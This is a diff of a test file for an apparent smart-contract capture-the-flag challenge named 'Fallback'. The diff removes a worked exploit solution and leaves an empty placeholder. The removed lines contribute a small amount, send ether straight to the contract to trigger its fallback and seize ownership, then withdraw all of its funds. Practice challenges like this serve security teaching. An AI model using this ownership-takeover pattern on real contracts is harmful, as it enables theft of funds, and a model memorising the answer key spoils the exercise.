@@ -26,28 +26,7 @@ describe('[Challenge] Fallback', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        console.log(`\t contributing...`);
-        let conTx = await this.target.connect(attacker).contribute({value: some_ether});
-        await conTx.wait();
-        let contribute = await this.target.contributions(attacker.address);
-        console.log(`\t attacker contribute for ${ethers.utils.formatEther(contribute)} ether`);
-        // Takeover the contract's owner by sending some ethers
-        console.log(`\t taking over owner...`);
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        let sendTx = await attacker.sendTransaction(tx);
-        await sendTx.wait();
-        let owner = await this.target.owner();
-        console.log(`\t owner: ${owner}`);
-        console.log(`\t attacker: ${attacker.address}`);
-        // Withdraw all ethers in the contract
-        console.log(`\t withdrawing...`);
-        let withdrawTx = await this.target.connect(attacker).withdraw();
-        await withdrawTx.wait();
+        
     }).timeout(0);
 
     after(async () => {
